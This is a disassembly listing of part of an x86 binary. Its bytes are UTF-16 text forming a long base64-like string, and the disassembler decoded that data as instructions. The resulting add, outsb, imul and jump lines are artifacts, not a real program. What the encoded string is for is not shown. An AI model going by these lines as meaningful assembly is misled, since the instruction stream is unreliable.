  40a91b:	00 48 00             	add    %cl,0x0(%eax)
  40a91e:	36 00 51 00          	add    %dl,%ss:0x0(%ecx)
  40a922:	58                   	pop    %eax
  40a923:	00 4f 00             	add    %cl,0x0(%edi)
  40a926:	6e                   	outsb  %ds:(%esi),(%dx)
  40a927:	00 46 00             	add    %al,0x0(%esi)
  40a92a:	4c                   	dec    %esp
  40a92b:	00 6e 00             	add    %ch,0x0(%esi)
  40a92e:	69 00 30 00 53 00    	imul   $0x530030,(%eax),%eax
  40a934:	4d                   	dec    %ebp
  40a935:	00 31                	add    %dh,(%ecx)
  40a937:	00 31                	add    %dh,(%ecx)
  40a939:	00 41 00             	add    %al,0x0(%ecx)
  40a93c:	6c                   	insb   (%dx),%es:(%edi)
  40a93d:	00 37                	add    %dh,(%edi)
  40a93f:	00 56 00             	add    %dl,0x0(%esi)
  40a942:	2b 00                	sub    (%eax),%eax
  40a944:	31 00                	xor    %eax,(%eax)
  40a946:	68 00 62 00 31       	push   $0x31006200
  40a94b:	00 50 00             	add    %dl,0x0(%eax)
  40a94e:	4a                   	dec    %edx
  40a94f:	00 37                	add    %dh,(%edi)
  40a951:	00 76 00             	add    %dh,0x0(%esi)
  40a954:	61                   	popa
  40a955:	00 31                	add    %dh,(%ecx)
  40a957:	00 46 00             	add    %al,0x0(%esi)
  40a95a:	69 00 6c 00 71 00    	imul   $0x71006c,(%eax),%eax
  40a960:	46                   	inc    %esi
  40a961:	00 44 00 35          	add    %al,0x35(%eax,%eax,1)
  40a965:	00 71 00             	add    %dh,0x0(%ecx)
  40a968:	6b 00 53             	imul   $0x53,(%eax),%eax
  40a96b:	00 4c 00 37          	add    %cl,0x37(%eax,%eax,1)
  40a96f:	00 53 00             	add    %dl,0x0(%ebx)
  40a972:	55                   	push   %ebp
  40a973:	00 42 00             	add    %al,0x0(%edx)
  40a976:	62 00                	bound  %eax,(%eax)
  40a978:	6f                   	outsl  %ds:(%esi),(%dx)
  40a979:	00 36                	add    %dh,(%esi)
  40a97b:	00 62 00             	add    %ah,0x0(%edx)
  40a97e:	51                   	push   %ecx
  40a97f:	00 55 00             	add    %dl,0x0(%ebp)
  40a982:	33 00                	xor    (%eax),%eax
  40a984:	58                   	pop    %eax
  40a985:	00 6a 00             	add    %ch,0x0(%edx)
  40a988:	52                   	push   %edx
  40a989:	00 2b                	add    %ch,(%ebx)
  40a98b:	00 54 00 48          	add    %dl,0x48(%eax,%eax,1)
  40a98f:	00 57 00             	add    %dl,0x0(%edi)
  40a992:	79 00                	jns    0x40a994
  40a994:	4f                   	dec    %edi
  40a995:	00 55 00             	add    %dl,0x0(%ebp)
  40a998:	4a                   	dec    %edx
  40a999:	00 6b 00             	add    %ch,0x0(%ebx)
  40a99c:	59                   	pop    %ecx
  40a99d:	00 57 00             	add    %dl,0x0(%edi)
  40a9a0:	4f                   	dec    %edi
  40a9a1:	00 6f 00             	add    %ch,0x0(%edi)
  40a9a4:	75 00                	jne    0x40a9a6
  40a9a6:	36 00 74 00 5a       	add    %dh,%ss:0x5a(%eax,%eax,1)
  40a9ab:	00 33                	add    %dh,(%ebx)
  40a9ad:	00 71 00             	add    %dh,0x0(%ecx)
  40a9b0:	43                   	inc    %ebx
  40a9b1:	00 70 00             	add    %dh,0x0(%eax)
  40a9b4:	63 00                	arpl   %eax,(%eax)
  40a9b6:	62 00                	bound  %eax,(%eax)
  40a9b8:	30 00                	xor    %al,(%eax)
  40a9ba:	6e                   	outsb  %ds:(%esi),(%dx)
  40a9bb:	00 76 00             	add    %dh,0x0(%esi)
  40a9be:	7a 00                	jp     0x40a9c0
  40a9c0:	75 00                	jne    0x40a9c2
  40a9c2:	34 00                	xor    $0x0,%al
  40a9c4:	49                   	dec    %ecx
  40a9c5:	00 66 00             	add    %ah,0x0(%esi)
  40a9c8:	33 00                	xor    (%eax),%eax
  40a9ca:	38 00                	cmp    %al,(%eax)
  40a9cc:	38 00                	cmp    %al,(%eax)
  40a9ce:	49                   	dec    %ecx
  40a9cf:	00 50 00             	add    %dl,0x0(%eax)
  40a9d2:	4e                   	dec    %esi
  40a9d3:	00 2b                	add    %ch,(%ebx)
  40a9d5:	00 4a 00             	add    %cl,0x0(%edx)
  40a9d8:	47                   	inc    %edi
  40a9d9:	00 61 00             	add    %ah,0x0(%ecx)
  40a9dc:	79 00                	jns    0x40a9de
  40a9de:	35 00 38 00 78       	xor    $0x78003800,%eax
  40a9e3:	00 31                	add    %dh,(%ecx)
  40a9e5:	00 57 00             	add    %dl,0x0(%edi)
  40a9e8:	54                   	push   %esp
  40a9e9:	00 32                	add    %dh,(%edx)
  40a9eb:	00 6e 00             	add    %ch,0x0(%esi)
  40a9ee:	5a                   	pop    %edx
  40a9ef:	00 45 00             	add    %al,0x0(%ebp)
  40a9f2:	6b 00 2f             	imul   $0x2f,(%eax),%eax
  40a9f5:	00 71 00             	add    %dh,0x0(%ecx)
  40a9f8:	4d                   	dec    %ebp
  40a9f9:	00 7a 00             	add    %bh,0x0(%edx)
  40a9fc:	5a                   	pop    %edx
  40a9fd:	00 6d 00             	add    %ch,0x0(%ebp)
  40aa00:	70 00                	jo     0x40aa02
  40aa02:	77 00                	ja     0x40aa04
  40aa04:	30 00                	xor    %al,(%eax)
  40aa06:	70 00                	jo     0x40aa08
  40aa08:	78 00                	js     0x40aa0a
  40aa0a:	70 00                	jo     0x40aa0c
  40aa0c:	4d                   	dec    %ebp
  40aa0d:	00 51 00             	add    %dl,0x0(%ecx)
  40aa10:	36 00 55 00          	add    %dl,%ss:0x0(%ebp)
  40aa14:	6b 00 36             	imul   $0x36,(%eax),%eax
  40aa17:	00 32                	add    %dh,(%edx)
  40aa19:	00 73 00             	add    %dh,0x0(%ebx)
  40aa1c:	66 00 47 00          	data16 add %al,0x0(%edi)
  40aa20:	4d                   	dec    %ebp
  40aa21:	00 7a 00             	add    %bh,0x0(%edx)
  40aa24:	51                   	push   %ecx
  40aa25:	00 6d 00             	add    %ch,0x0(%ebp)
  40aa28:	66 00 2f             	data16 add %ch,(%edi)
  40aa2b:	00 36                	add    %dh,(%esi)
  40aa2d:	00 4e 00             	add    %cl,0x0(%esi)
  40aa30:	4c                   	dec    %esp
  40aa31:	00 41 00             	add    %al,0x0(%ecx)
  40aa34:	31 00                	xor    %eax,(%eax)
  40aa36:	35 00 47 00 6e       	xor    $0x6e004700,%eax
  40aa3b:	00 46 00             	add    %al,0x0(%esi)
  40aa3e:	63 00                	arpl   %eax,(%eax)
  40aa40:	38 00                	cmp    %al,(%eax)
  40aa42:	55                   	push   %ebp
  40aa43:	00 67 00             	add    %ah,0x0(%edi)
  40aa46:	61                   	popa
  40aa47:	00 5a 00             	add    %bl,0x0(%edx)
  40aa4a:	56                   	push   %esi
  40aa4b:	00 59 00             	add    %bl,0x0(%ecx)
  40aa4e:	72 00                	jb     0x40aa50
  40aa50:	78 00                	js     0x40aa52
  40aa52:	71 00                	jno    0x40aa54
  40aa54:	67 00 6e 00          	add    %ch,0x0(%bp)
  40aa58:	4b                   	dec    %ebx
  40aa59:	00 38                	add    %bh,(%eax)
  40aa5b:	00 4f 00             	add    %cl,0x0(%edi)
  40aa5e:	2b 00                	sub    (%eax),%eax
  40aa60:	31 00                	xor    %eax,(%eax)
  40aa62:	6c                   	insb   (%dx),%es:(%edi)
  40aa63:	00 48 00             	add    %cl,0x0(%eax)
  40aa66:	4a                   	dec    %edx
  40aa67:	00 6e 00             	add    %ch,0x0(%esi)
  40aa6a:	68 00 68 00 6d       	push   $0x6d006800
  40aa6f:	00 54 00 58          	add    %dl,0x58(%eax,%eax,1)
  40aa73:	00 42 00             	add    %al,0x0(%edx)
  40aa76:	41                   	inc    %ecx
  40aa77:	00 47 00             	add    %al,0x0(%edi)
  40aa7a:	49                   	dec    %ecx
  40aa7b:	00 64 00 58          	add    %ah,0x58(%eax,%eax,1)
  40aa7f:	00 72 00             	add    %dh,0x0(%edx)
  40aa82:	57                   	push   %edi
  40aa83:	00 56 00             	add    %dl,0x0(%esi)
  40aa86:	70 00                	jo     0x40aa88
  40aa88:	68 00 72 00 55       	push   $0x55007200
  40aa8d:	00 4e 00             	add    %cl,0x0(%esi)
  40aa90:	45                   	inc    %ebp
  40aa91:	00 61 00             	add    %ah,0x0(%ecx)
  40aa94:	6d                   	insl   (%dx),%es:(%edi)
  40aa95:	00 69 00             	add    %ch,0x0(%ecx)
  40aa98:	4d                   	dec    %ebp
  40aa99:	00 49 00             	add    %cl,0x0(%ecx)
  40aa9c:	4f                   	dec    %edi
  40aa9d:	00 74 00 67          	add    %dh,0x67(%eax,%eax,1)
  40aaa1:	00 41 00             	add    %al,0x0(%ecx)
  40aaa4:	4b                   	dec    %ebx
  40aaa5:	00 36                	add    %dh,(%esi)
  40aaa7:	00 77 00             	add    %dh,0x0(%edi)
  40aaaa:	76 00                	jbe    0x40aaac
  40aaac:	48                   	dec    %eax
  40aaad:	00 77 00             	add    %dh,0x0(%edi)
  40aab0:	73 00                	jae    0x40aab2
  40aab2:	4d                   	dec    %ebp
  40aab3:	00 4a 00             	add    %cl,0x0(%edx)
  40aab6:	33 00                	xor    (%eax),%eax
  40aab8:	5a                   	pop    %edx
  40aab9:	00 36                	add    %dh,(%esi)
  40aabb:	00 54 00 30          	add    %dl,0x30(%eax,%eax,1)
  40aabf:	00 4d 00             	add    %cl,0x0(%ebp)
  40aac2:	4d                   	dec    %ebp
  40aac3:	00 73 00             	add    %dh,0x0(%ebx)
  40aac6:	6e                   	outsb  %ds:(%esi),(%dx)
  40aac7:	00 53 00             	add    %dl,0x0(%ebx)
  40aaca:	66 00 39             	data16 add %bh,(%ecx)
  40aacd:	00 35 00 4a 00 45    	add    %dh,0x45004a00
  40aad3:	00 67 00             	add    %ah,0x0(%edi)
  40aad6:	55                   	push   %ebp
  40aad7:	00 63 00             	add    %ah,0x0(%ebx)
  40aada:	41                   	inc    %ecx
  40aadb:	00 51 00             	add    %dl,0x0(%ecx)
  40aade:	6e                   	outsb  %ds:(%esi),(%dx)
  40aadf:	00 37                	add    %dh,(%edi)
  40aae1:	00 62 00             	add    %ah,0x0(%edx)
  40aae4:	68 00 2f 00 57       	push   $0x57002f00
  40aae9:	00 6a 00             	add    %ch,0x0(%edx)
  40aaec:	59                   	pop    %ecx
  40aaed:	00 6c 00 52          	add    %ch,0x52(%eax,%eax,1)
  40aaf1:	00 36                	add    %dh,(%esi)
  40aaf3:	00 63 00             	add    %ah,0x0(%ebx)
  40aaf6:	4b                   	dec    %ebx
  40aaf7:	00 45 00             	add    %al,0x0(%ebp)
  40aafa:	4c                   	dec    %esp
  40aafb:	00 41 00             	add    %al,0x0(%ecx)
  40aafe:	61                   	popa
  40aaff:	00 69 00             	add    %ch,0x0(%ecx)
  40ab02:	30 00                	xor    %al,(%eax)
  40ab04:	48                   	dec    %eax
  40ab05:	00 6e 00             	add    %ch,0x0(%esi)
  40ab08:	41                   	inc    %ecx
  40ab09:	00 69 00             	add    %ch,0x0(%ecx)
  40ab0c:	56                   	push   %esi
  40ab0d:	00 65 00             	add    %ah,0x0(%ebp)
  40ab10:	73 00                	jae    0x40ab12
  40ab12:	57                   	push   %edi
  40ab13:	00 6a 00             	add    %ch,0x0(%edx)
  40ab16:	34 00                	xor    $0x0,%al
  40ab18:	57                   	push   %edi
  40ab19:	00 61 00             	add    %ah,0x0(%ecx)
  40ab1c:	5a                   	pop    %edx
  40ab1d:	00 41 00             	add    %al,0x0(%ecx)
  40ab20:	59                   	pop    %ecx
  40ab21:	00 75 00             	add    %dh,0x0(%ebp)
  40ab24:	38 00                	cmp    %al,(%eax)
  40ab26:	52                   	push   %edx
  40ab27:	00 70 00             	add    %dh,0x0(%eax)
  40ab2a:	6a 00                	push   $0x0
  40ab2c:	6d                   	insl   (%dx),%es:(%edi)
  40ab2d:	00 74 00 7a          	add    %dh,0x7a(%eax,%eax,1)
  40ab31:	00 38                	add    %bh,(%eax)
  40ab33:	00 55 00             	add    %dl,0x0(%ebp)
  40ab36:	48                   	dec    %eax
  40ab37:	00 66 00             	add    %ah,0x0(%esi)
  40ab3a:	31 00                	xor    %eax,(%eax)
  40ab3c:	76 00                	jbe    0x40ab3e
  40ab3e:	69 00 36 00 36 00    	imul   $0x360036,(%eax),%eax
  40ab44:	47                   	inc    %edi
  40ab45:	00 58 00             	add    %bl,0x0(%eax)
  40ab48:	78 00                	js     0x40ab4a
  40ab4a:	37                   	aaa
  40ab4b:	00 4b 00             	add    %cl,0x0(%ebx)
  40ab4e:	4d                   	dec    %ebp
  40ab4f:	00 76 00             	add    %dh,0x0(%esi)
  40ab52:	77 00                	ja     0x40ab54
  40ab54:	59                   	pop    %ecx
  40ab55:	00 74 00 74          	add    %dh,0x74(%eax,%eax,1)
  40ab59:	00 49 00             	add    %cl,0x0(%ecx)
  40ab5c:	68 00 4a 00 36       	push   $0x36004a00
  40ab61:	00 77 00             	add    %dh,0x0(%edi)
  40ab64:	78 00                	js     0x40ab66
  40ab66:	31 00                	xor    %eax,(%eax)
  40ab68:	4d                   	dec    %ebp
  40ab69:	00 42 00             	add    %al,0x0(%edx)
  40ab6c:	39 00                	cmp    %eax,(%eax)
  40ab6e:	4c                   	dec    %esp
  40ab6f:	00 54 00 75          	add    %dl,0x75(%eax,%eax,1)
  40ab73:	00 54 00 65          	add    %dl,0x65(%eax,%eax,1)
  40ab77:	00 44 00 33          	add    %al,0x33(%eax,%eax,1)
  40ab7b:	00 65 00             	add    %ah,0x0(%ebp)
  40ab7e:	61                   	popa
  40ab7f:	00 47 00             	add    %al,0x0(%edi)
  40ab82:	70 00                	jo     0x40ab84
  40ab84:	4b                   	dec    %ebx
  40ab85:	00 4c 00 58          	add    %cl,0x58(%eax,%eax,1)
  40ab89:	00 77 00             	add    %dh,0x0(%edi)
  40ab8c:	49                   	dec    %ecx
  40ab8d:	00 50 00             	add    %dl,0x0(%eax)
  40ab90:	48                   	dec    %eax
  40ab91:	00 79 00             	add    %bh,0x0(%ecx)
  40ab94:	51                   	push   %ecx
  40ab95:	00 63 00             	add    %ah,0x0(%ebx)
  40ab98:	55                   	push   %ebp
  40ab99:	00 4d 00             	add    %cl,0x0(%ebp)
  40ab9c:	66 00 34 00          	data16 add %dh,(%eax,%eax,1)
  40aba0:	56                   	push   %esi
  40aba1:	00 42 00             	add    %al,0x0(%edx)
  40aba4:	71 00                	jno    0x40aba6
  40aba6:	61                   	popa
  40aba7:	00 56 00             	add    %dl,0x0(%esi)
  40abaa:	55                   	push   %ebp
  40abab:	00 2b                	add    %ch,(%ebx)
  40abad:	00 2b                	add    %ch,(%ebx)
  40abaf:	00 45 00             	add    %al,0x0(%ebp)
  40abb2:	51                   	push   %ecx
  40abb3:	00 73 00             	add    %dh,0x0(%ebx)
  40abb6:	53                   	push   %ebx
  40abb7:	00 51 00             	add    %dl,0x0(%ecx)
  40abba:	4f                   	dec    %edi
  40abbb:	00 6f 00             	add    %ch,0x0(%edi)
  40abbe:	78 00                	js     0x40abc0
  40abc0:	39 00                	cmp    %eax,(%eax)
  40abc2:	31 00                	xor    %eax,(%eax)
  40abc4:	4d                   	dec    %ebp
  40abc5:	00 6f 00             	add    %ch,0x0(%edi)
  40abc8:	52                   	push   %edx
  40abc9:	00 36                	add    %dh,(%esi)
  40abcb:	00 4d 00             	add    %cl,0x0(%ebp)
  40abce:	2f                   	das
  40abcf:	00 78 00             	add    %bh,0x0(%eax)
  40abd2:	42                   	inc    %edx
  40abd3:	00 38                	add    %bh,(%eax)
  40abd5:	00 7a 00             	add    %bh,0x0(%edx)
  40abd8:	32 00                	xor    (%eax),%al
  40abda:	66 00 71 00          	data16 add %dh,0x0(%ecx)
  40abde:	36 00 46 00          	add    %al,%ss:0x0(%esi)
  40abe2:	76 00                	jbe    0x40abe4
  40abe4:	36 00 72 00          	add    %dh,%ss:0x0(%edx)
  40abe8:	32 00                	xor    (%eax),%al
  40abea:	51                   	push   %ecx
  40abeb:	00 44 00 50          	add    %al,0x50(%eax,%eax,1)
  40abef:	00 41 00             	add    %al,0x0(%ecx)
  40abf2:	50                   	push   %eax
  40abf3:	00 52 00             	add    %dl,0x0(%edx)
  40abf6:	68 00 65 00 4b       	push   $0x4b006500
  40abfb:	00 41 00             	add    %al,0x0(%ecx)
  40abfe:	2b 00                	sub    (%eax),%eax
  40ac00:	65 00 66 00          	add    %ah,%gs:0x0(%esi)
  40ac04:	33 00                	xor    (%eax),%eax
  40ac06:	50                   	push   %eax
  40ac07:	00 7a 00             	add    %bh,0x0(%edx)
  40ac0a:	4b                   	dec    %ebx
  40ac0b:	00 6e 00             	add    %ch,0x0(%esi)
  40ac0e:	44                   	inc    %esp
  40ac0f:	00 65 00             	add    %ah,0x0(%ebp)
  40ac12:	36 00 4d 00          	add    %cl,%ss:0x0(%ebp)
  40ac16:	48                   	dec    %eax
  40ac17:	00 6b 00             	add    %ch,0x0(%ebx)
  40ac1a:	5a                   	pop    %edx
  40ac1b:	00 59 00             	add    %bl,0x0(%ecx)
  40ac1e:	62 00                	bound  %eax,(%eax)
  40ac20:	47                   	inc    %edi
  40ac21:	00 4c 00 37          	add    %cl,0x37(%eax,%eax,1)
  40ac25:	00 43 00             	add    %al,0x0(%ebx)
  40ac28:	49                   	dec    %ecx
  40ac29:	00 57 00             	add    %dl,0x0(%edi)
  40ac2c:	58                   	pop    %eax
  40ac2d:	00 54 00 39          	add    %dl,0x39(%eax,%eax,1)
  40ac31:	00 44 00 6d          	add    %al,0x6d(%eax,%eax,1)
  40ac35:	00 42 00             	add    %al,0x0(%edx)
  40ac38:	72 00                	jb     0x40ac3a
  40ac3a:	62 00                	bound  %eax,(%eax)
  40ac3c:	6d                   	insl   (%dx),%es:(%edi)
  40ac3d:	00 31                	add    %dh,(%ecx)
  40ac3f:	00 4f 00             	add    %cl,0x0(%edi)
  40ac42:	39 00                	cmp    %eax,(%eax)
  40ac44:	2f                   	das
  40ac45:	00 64 00 52          	add    %ah,0x52(%eax,%eax,1)
  40ac49:	00 44 00 70          	add    %al,0x70(%eax,%eax,1)
  40ac4d:	00 75 00             	add    %dh,0x0(%ebp)
  40ac50:	2b 00                	sub    (%eax),%eax
  40ac52:	44                   	inc    %esp
  40ac53:	00 43 00             	add    %al,0x0(%ebx)
  40ac56:	59                   	pop    %ecx
  40ac57:	00 54 00 31          	add    %dl,0x31(%eax,%eax,1)
  40ac5b:	00 63 00             	add    %ah,0x0(%ebx)
  40ac5e:	31 00                	xor    %eax,(%eax)
  40ac60:	79 00                	jns    0x40ac62
  40ac62:	7a 00                	jp     0x40ac64
  40ac64:	4c                   	dec    %esp
  40ac65:	00 67 00             	add    %ah,0x0(%edi)
  40ac68:	5a                   	pop    %edx
  40ac69:	00 57 00             	add    %dl,0x0(%edi)
  40ac6c:	6f                   	outsl  %ds:(%esi),(%dx)
  40ac6d:	00 42 00             	add    %al,0x0(%edx)
  40ac70:	61                   	popa
  40ac71:	00 6c 00 50          	add    %ch,0x50(%eax,%eax,1)
  40ac75:	00 5a 00             	add    %bl,0x0(%edx)
  40ac78:	65 00 45 00          	add    %al,%gs:0x0(%ebp)
  40ac7c:	46                   	inc    %esi
  40ac7d:	00 2f                	add    %ch,(%edi)
  40ac7f:	00 71 00             	add    %dh,0x0(%ecx)
  40ac82:	38 00                	cmp    %al,(%eax)
  40ac84:	62 00                	bound  %eax,(%eax)
  40ac86:	59                   	pop    %ecx
  40ac87:	00 4f 00             	add    %cl,0x0(%edi)
  40ac8a:	46                   	inc    %esi
  40ac8b:	00 6d 00             	add    %ch,0x0(%ebp)
  40ac8e:	2f                   	das
  40ac8f:	00 6d 00             	add    %ch,0x0(%ebp)
  40ac92:	50                   	push   %eax
  40ac93:	00 6d 00             	add    %ch,0x0(%ebp)
  40ac96:	66 00 4a 00          	data16 add %cl,0x0(%edx)
  40ac9a:	6e                   	outsb  %ds:(%esi),(%dx)
  40ac9b:	00 6b 00             	add    %ch,0x0(%ebx)
  40ac9e:	32 00                	xor    (%eax),%al
  40aca0:	39 00                	cmp    %eax,(%eax)
  40aca2:	75 00                	jne    0x40aca4
  40aca4:	73 00                	jae    0x40aca6
  40aca6:	41                   	inc    %ecx
  40aca7:	00 77 00             	add    %dh,0x0(%edi)
  40acaa:	33 00                	xor    (%eax),%eax
  40acac:	50                   	push   %eax
  40acad:	00 33                	add    %dh,(%ebx)
  40acaf:	00 4b 00             	add    %cl,0x0(%ebx)
  40acb2:	63 00                	arpl   %eax,(%eax)
  40acb4:	6f                   	outsl  %ds:(%esi),(%dx)
  40acb5:	00 31                	add    %dh,(%ecx)
  40acb7:	00 77 00             	add    %dh,0x0(%edi)
  40acba:	48                   	dec    %eax
  40acbb:	00 44 00 6d          	add    %al,0x6d(%eax,%eax,1)
  40acbf:	00 6a 00             	add    %ch,0x0(%edx)
  40acc2:	74 00                	je     0x40acc4
  40acc4:	4d                   	dec    %ebp
  40acc5:	00 4c 00 77          	add    %cl,0x77(%eax,%eax,1)
  40acc9:	00 56 00             	add    %dl,0x0(%esi)
  40accc:	5a                   	pop    %edx
  40accd:	00 78 00             	add    %bh,0x0(%eax)
  40acd0:	64 00 38             	add    %bh,%fs:(%eax)
  40acd3:	00 4b 00             	add    %cl,0x0(%ebx)
  40acd6:	39 00                	cmp    %eax,(%eax)
  40acd8:	6e                   	outsb  %ds:(%esi),(%dx)
  40acd9:	00 48 00             	add    %cl,0x0(%eax)
  40acdc:	46                   	inc    %esi
  40acdd:	00 77 00             	add    %dh,0x0(%edi)
  40ace0:	76 00                	jbe    0x40ace2
  40ace2:	51                   	push   %ecx
  40ace3:	00 48 00             	add    %cl,0x0(%eax)
  40ace6:	43                   	inc    %ebx
  40ace7:	00 45 00             	add    %al,0x0(%ebp)
  40acea:	56                   	push   %esi
  40aceb:	00 36                	add    %dh,(%esi)
  40aced:	00 54 00 42          	add    %dl,0x42(%eax,%eax,1)
  40acf1:	00 32                	add    %dh,(%edx)
  40acf3:	00 6c 00 43          	add    %ch,0x43(%eax,%eax,1)
  40acf7:	00 52 00             	add    %dl,0x0(%edx)
  40acfa:	36 00 4c 00 45       	add    %cl,%ss:0x45(%eax,%eax,1)
  40acff:	00 50 00             	add    %dl,0x0(%eax)
  40ad02:	73 00                	jae    0x40ad04
  40ad04:	74 00                	je     0x40ad06
  40ad06:	72 00                	jb     0x40ad08
  40ad08:	37                   	aaa
  40ad09:	00 30                	add    %dh,(%eax)
  40ad0b:	00 52 00             	add    %dl,0x0(%edx)
  40ad0e:	79 00                	jns    0x40ad10
  40ad10:	49                   	dec    %ecx
  40ad11:	00 39                	add    %bh,(%ecx)
  40ad13:	00 45 00             	add    %al,0x0(%ebp)
  40ad16:	37                   	aaa
  40ad17:	00 4f 00             	add    %cl,0x0(%edi)
  40ad1a:	56                   	push   %esi
  40ad1b:	00 7a 00             	add    %bh,0x0(%edx)
  40ad1e:	43                   	inc    %ebx
  40ad1f:	00 30                	add    %dh,(%eax)
  40ad21:	00 6c 00 4e          	add    %ch,0x4e(%eax,%eax,1)
  40ad25:	00 6c 00 6b          	add    %ch,0x6b(%eax,%eax,1)
  40ad29:	00 35 00 31 00 2f    	add    %dh,0x2f003100
  40ad2f:	00 79 00             	add    %bh,0x0(%ecx)
  40ad32:	38 00                	cmp    %al,(%eax)
  40ad34:	48                   	dec    %eax
  40ad35:	00 77 00             	add    %dh,0x0(%edi)
  40ad38:	4d                   	dec    %ebp
  40ad39:	00 78 00             	add    %bh,0x0(%eax)
  40ad3c:	30 00                	xor    %al,(%eax)
  40ad3e:	31 00                	xor    %eax,(%eax)
  40ad40:	37                   	aaa
  40ad41:	00 79 00             	add    %bh,0x0(%ecx)
  40ad44:	54                   	push   %esp
  40ad45:	00 2f                	add    %ch,(%edi)
  40ad47:	00 4a 00             	add    %cl,0x0(%edx)
  40ad4a:	70 00                	jo     0x40ad4c
  40ad4c:	75 00                	jne    0x40ad4e
  40ad4e:	7a 00                	jp     0x40ad50
  40ad50:	72 00                	jb     0x40ad52
  40ad52:	34 00                	xor    $0x0,%al
  40ad54:	42                   	inc    %edx
  40ad55:	00 54 00 33          	add    %dl,0x33(%eax,%eax,1)
  40ad59:	00 65 00             	add    %ah,0x0(%ebp)
  40ad5c:	71 00                	jno    0x40ad5e
  40ad5e:	34 00                	xor    $0x0,%al
  40ad60:	4d                   	dec    %ebp
  40ad61:	00 33                	add    %dh,(%ebx)
  40ad63:	00 37                	add    %dh,(%edi)
  40ad65:	00 38                	add    %bh,(%eax)
  40ad67:	00 44 00 5a          	add    %al,0x5a(%eax,%eax,1)
  40ad6b:	00 39                	add    %bh,(%ecx)
  40ad6d:	00 67 00             	add    %ah,0x0(%edi)
  40ad70:	52                   	push   %edx
  40ad71:	00 5a 00             	add    %bl,0x0(%edx)
  40ad74:	48                   	dec    %eax
  40ad75:	00 33                	add    %dh,(%ebx)
  40ad77:	00 37                	add    %dh,(%edi)
  40ad79:	00 64 00 79          	add    %ah,0x79(%eax,%eax,1)
  40ad7d:	00 77 00             	add    %dh,0x0(%edi)
  40ad80:	74 00                	je     0x40ad82
  40ad82:	35 00 67 00 48       	xor    $0x48006700,%eax
  40ad87:	00 70 00             	add    %dh,0x0(%eax)
  40ad8a:	61                   	popa
  40ad8b:	00 44 00 6c          	add    %al,0x6c(%eax,%eax,1)
  40ad8f:	00 61 00             	add    %ah,0x0(%ecx)
  40ad92:	31 00                	xor    %eax,(%eax)
  40ad94:	49                   	dec    %ecx
  40ad95:	00 50 00             	add    %dl,0x0(%eax)
  40ad98:	6f                   	outsl  %ds:(%esi),(%dx)
  40ad99:	00 52 00             	add    %dl,0x0(%edx)
  40ad9c:	32 00                	xor    (%eax),%al
  40ad9e:	44                   	inc    %esp
  40ad9f:	00 2b                	add    %ch,(%ebx)
  40ada1:	00 2b                	add    %ch,(%ebx)
  40ada3:	00 38                	add    %bh,(%eax)
  40ada5:	00 77 00             	add    %dh,0x0(%edi)
  40ada8:	73 00                	jae    0x40adaa
  40adaa:	75 00                	jne    0x40adac
  40adac:	66 00 41 00          	data16 add %al,0x0(%ecx)
  40adb0:	75 00                	jne    0x40adb2
  40adb2:	31 00                	xor    %eax,(%eax)
  40adb4:	4d                   	dec    %ebp
  40adb5:	00 75 00             	add    %dh,0x0(%ebp)
  40adb8:	57                   	push   %edi
  40adb9:	00 30                	add    %dh,(%eax)
  40adbb:	00 6d 00             	add    %ch,0x0(%ebp)
  40adbe:	57                   	push   %edi
  40adbf:	00 76 00             	add    %dh,0x0(%esi)
  40adc2:	47                   	inc    %edi
  40adc3:	00 6c 00 51          	add    %ch,0x51(%eax,%eax,1)
  40adc7:	00 41 00             	add    %al,0x0(%ecx)
  40adca:	74 00                	je     0x40adcc
  40adcc:	65 00 47 00          	add    %al,%gs:0x0(%edi)
  40add0:	4c                   	dec    %esp
  40add1:	00 75 00             	add    %dh,0x0(%ebp)
  40add4:	39 00                	cmp    %eax,(%eax)
  40add6:	50                   	push   %eax
  40add7:	00 33                	add    %dh,(%ebx)
  40add9:	00 57 00             	add    %dl,0x0(%edi)
  40addc:	64 00 49 00          	add    %cl,%fs:0x0(%ecx)
  40ade0:	4b                   	dec    %ebx
  40ade1:	00 4f 00             	add    %cl,0x0(%edi)
  40ade4:	4d                   	dec    %ebp
  40ade5:	00 6b 00             	add    %ch,0x0(%ebx)
  40ade8:	2b 00                	sub    (%eax),%eax
  40adea:	39 00                	cmp    %eax,(%eax)
  40adec:	74 00                	je     0x40adee
  40adee:	53                   	push   %ebx
  40adef:	00 6e 00             	add    %ch,0x0(%esi)
  40adf2:	6e                   	outsb  %ds:(%esi),(%dx)
  40adf3:	00 30                	add    %dh,(%eax)
  40adf5:	00 75 00             	add    %dh,0x0(%ebp)
  40adf8:	32 00                	xor    (%eax),%al
  40adfa:	47                   	inc    %edi
  40adfb:	00 31                	add    %dh,(%ecx)
  40adfd:	00 65 00             	add    %ah,0x0(%ebp)
  40ae00:	6f                   	outsl  %ds:(%esi),(%dx)
  40ae01:	00 6b 00             	add    %ch,0x0(%ebx)
  40ae04:	37                   	aaa
  40ae05:	00 56 00             	add    %dl,0x0(%esi)
  40ae08:	6a 00                	push   $0x0
  40ae0a:	6c                   	insb   (%dx),%es:(%edi)
  40ae0b:	00 2f                	add    %ch,(%edi)
  40ae0d:	00 50 00             	add    %dl,0x0(%eax)
  40ae10:	48                   	dec    %eax
  40ae11:	00 6f 00             	add    %ch,0x0(%edi)
  40ae14:	41                   	inc    %ecx
  40ae15:	00 45 00             	add    %al,0x0(%ebp)
  40ae18:	33 00                	xor    (%eax),%eax
  40ae1a:	65 00 48 00          	add    %cl,%gs:0x0(%eax)
  40ae1e:	36 00 44 00 39       	add    %al,%ss:0x39(%eax,%eax,1)
  40ae23:	00 78 00             	add    %bh,0x0(%eax)
  40ae26:	6d                   	insl   (%dx),%es:(%edi)
  40ae27:	00 59 00             	add    %bl,0x0(%ecx)
  40ae2a:	59                   	pop    %ecx
  40ae2b:	00 77 00             	add    %dh,0x0(%edi)
  40ae2e:	4c                   	dec    %esp
  40ae2f:	00 6b 00             	add    %ch,0x0(%ebx)
  40ae32:	34 00                	xor    $0x0,%al
  40ae34:	4f                   	dec    %edi
  40ae35:	00 2b                	add    %ch,(%ebx)
  40ae37:	00 66 00             	add    %ah,0x0(%esi)
  40ae3a:	64 00 72 00          	add    %dh,%fs:0x0(%edx)
  40ae3e:	72 00                	jb     0x40ae40
  40ae40:	65 00 76 00          	add    %dh,%gs:0x0(%esi)
  40ae44:	6e                   	outsb  %ds:(%esi),(%dx)
  40ae45:	00 79 00             	add    %bh,0x0(%ecx)
  40ae48:	59                   	pop    %ecx
  40ae49:	00 58 00             	add    %bl,0x0(%eax)
  40ae4c:	34 00                	xor    $0x0,%al
